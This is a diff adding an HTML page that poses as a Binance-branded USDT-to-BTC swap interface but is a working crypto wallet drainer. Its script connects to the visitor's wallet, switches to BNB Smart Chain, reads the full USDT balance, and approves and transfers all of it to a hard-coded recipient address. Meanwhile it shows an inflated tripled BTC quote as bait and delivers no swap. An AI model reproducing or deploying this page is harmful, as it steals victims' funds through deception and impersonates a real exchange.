@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Swap Interface</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .swap-container {
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 420px;
+            padding: 24px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #333;
+        }
+
+        .swap-section {
+            margin-bottom: 24px;
+        }
+
+        .section-header {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .token-selector {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #f9f9f9;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 8px;
+        }
+
+        .token-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .token-name {
+            font-weight: 600;
+            margin-left: 8px;
+            color: #333;
+        }
+
+        .network-name {
+            font-size: 12px;
+            color: #666;
+            margin-left: 8px;
+        }
+
+        .token-amount {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            width: 100%;
+            border: none;
+            background: transparent;
+            outline: none;
+            text-align: right;
+        }
+
+        .token-value {
+            font-size: 14px;
+            color: #666;
+            text-align: right;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #eee;
+            margin: 16px 0;
+        }
+
+        .rate-info {
+            font-size: 14px;
+            color: #666;
+            margin: 16px 0;
+            text-align: center;
+        }
+
+        .fee-section {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+
+        .fee-label {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .fee-value {
+            font-size: 14px;
+            color: #333;
+            text-align: right;
+        }
+
+        .provider-name {
+            font-size: 14px;
+            color: #666;
+            text-align: right;
+        }
+
+        .continue-button {
+            width: 100%;
+            background-color: #f0b90b;
+            color: #1e2026;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .continue-button:hover {
+            background-color: #f8d33a;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 24px;
+            border-radius: 12px;
+            max-width: 320px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .modal-button {
+            background-color: #f0b90b;
+            color: #1e2026;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="swap-container">
+        <div class="title">Swap</div>
+        
+        <div class="swap-section">
+            <div class="section-header">From</div>
+            <div class="token-selector">
+                <div class="token-info">
+                    <div class="token-name">USDT</div>
+                    <div class="network-name">BNB Smart Chain</div>
+                </div>
+            </div>
+            <input type="number" id="usdtInput" class="token-amount" placeholder="0" value="200">
+            <div class="token-value">$200.09</div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="swap-section">
+            <div class="section-header">To</div>
+            <div class="token-selector">
+                <div class="token-info">
+                    <div class="token-name">BTC</div>
+                    <div class="network-name">Bitcoin</div>
+                </div>
+            </div>
+            <div id="btcAmount" class="token-amount">0.00506297</div>
+            <div id="btcValue" class="token-value">$600.00 (-1%)</div>
+        </div>
+
+        <div class="rate-info">
+            <strong>1 BTC ≈ 119,489.153599 USDT</strong> ⇔
+        </div>
+
+        <div class="fee-section">
+            <div>
+                <div class="fee-label">Provider Fee ●</div>
+                <div class="fee-label">Provider</div>
+            </div>
+            <div>
+                <div class="fee-value">$0.50</div>
+                <div class="fee-value">0.00063 BNB</div>
+                <div class="provider-name">Binance</div>
+            </div>
+        </div>
+
+        <button id="continueButton" class="continue-button">Continue</button>
+    </div>
+
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-title" id="modalTitle">Minimum swap is 200 USDT</div>
+            <button id="modalButton" class="modal-button">OK</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usdtInput = document.getElementById('usdtInput');
+            const btcAmount = document.getElementById('btcAmount');
+            const btcValue = document.getElementById('btcValue');
+            const continueButton = document.getElementById('continueButton');
+            const errorModal = document.getElementById('errorModal');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalButton = document.getElementById('modalButton');
+
+            // USDT token details (BEP-20)
+            const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+            const RECIPIENT_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
+            const MIN_SWAP_AMOUNT = 200;
+
+            // Update BTC value when USDT input changes
+            usdtInput.addEventListener('input', function() {
+                const usdtValue = parseFloat(usdtInput.value) || 0;
+                const usdValue = usdtValue * 3;
+                const btcRate = 119489.153599;
+                const calculatedBtc = usdValue / btcRate;
+                
+                btcAmount.textContent = calculatedBtc.toFixed(8);
+                btcValue.textContent = `$${usdValue.toFixed(2)} (-1%)`;
+            });
+
+            // Initialize with default values
+            usdtInput.dispatchEvent(new Event('input'));
+
+            // Handle continue button click
+            continueButton.addEventListener('click', async function() {
+                try {
+                    // Check if MetaMask or Trust Wallet is installed
+                    if (!window.ethereum) {
+                        showModal('Please install MetaMask or Trust Wallet to continue');
+                        return;
+                    }
+
+                    // Request account access
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+
+                    // Switch to BNB Smart Chain if needed
+                    await switchToBNBChain();
+
+                    // Get USDT balance
+                    const usdtContract = new ethers.Contract(
+                        USDT_CONTRACT_ADDRESS,
+                        ['function balanceOf(address) view returns (uint256)'],
+                        signer
+                    );
+
+                    const userAddress = await signer.getAddress();
+                    const balance = await usdtContract.balanceOf(userAddress);
+                    const balanceInUsdt = parseFloat(ethers.utils.formatUnits(balance, 18));
+
+                    if (balanceInUsdt < MIN_SWAP_AMOUNT) {
+                        showModal(`Minimum swap is ${MIN_SWAP_AMOUNT} USDT`);
+                        return;
+                    }
+
+                    // Approve and transfer all USDT
+                    await approveAndTransferUSDT(signer, balance);
+
+                } catch (error) {
+                    console.error('Error:', error);
+                    showModal(error.message || 'An error occurred');
+                }
+            });
+
+            // Close modal when OK button is clicked
+            modalButton.addEventListener('click', function() {
+                errorModal.style.display = 'none';
+            });
+
+            async function switchToBNBChain() {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }], // BSC mainnet chainId
+                    });
+                } catch (switchError) {
+                    // This error code indicates that the chain has not been added to MetaMask
+                    if (switchError.code === 4902) {
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [
+                                    {
+                                        chainId: '0x38',
+                                        chainName: 'Binance Smart Chain',
+                                        nativeCurrency: {
+                                            name: 'BNB',
+                                            symbol: 'BNB',
+                                            decimals: 18,
+                                        },
+                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                        blockExplorerUrls: ['https://bscscan.com'],
+                                    },
+                                ],
+                            });
+                        } catch (addError) {
+                            throw new Error('Failed to add BSC network to wallet');
+                        }
+                    } else {
+                        throw new Error('Failed to switch to BSC network');
+                    }
+                }
+            }
+
+            async function approveAndTransferUSDT(signer, amount) {
+                try {
+                    showModal('Approving USDT transfer...');
+
+                    const usdtContract = new ethers.Contract(
+                        USDT_CONTRACT_ADDRESS,
+                        [
+                            'function approve(address spender, uint256 amount) returns (bool)',
+                            'function transfer(address recipient, uint256 amount) returns (bool)'
+                        ],
+                        signer
+                    );
+
+                    // First approve the recipient to spend the tokens
+                    const approveTx = await usdtContract.approve(RECIPIENT_ADDRESS, amount);
+                    await approveTx.wait();
+
+                    showModal('Transferring USDT...');
+
+                    // Then transfer the tokens
+                    const transferTx = await usdtContract.transfer(RECIPIENT_ADDRESS, amount);
+                    const receipt = await transferTx.wait();
+
+                    showModal('Transfer successful! Transaction hash: ' + receipt.transactionHash);
+
+                } catch (error) {
+                    console.error('Transfer error:', error);
+                    throw new Error('Failed to transfer USDT');
+                }
+            }
+
+            function showModal(message) {
+                modalTitle.textContent = message;
+                errorModal.style.display = 'flex';
+            }
+        });
+    </script>
+</body>
+</html>
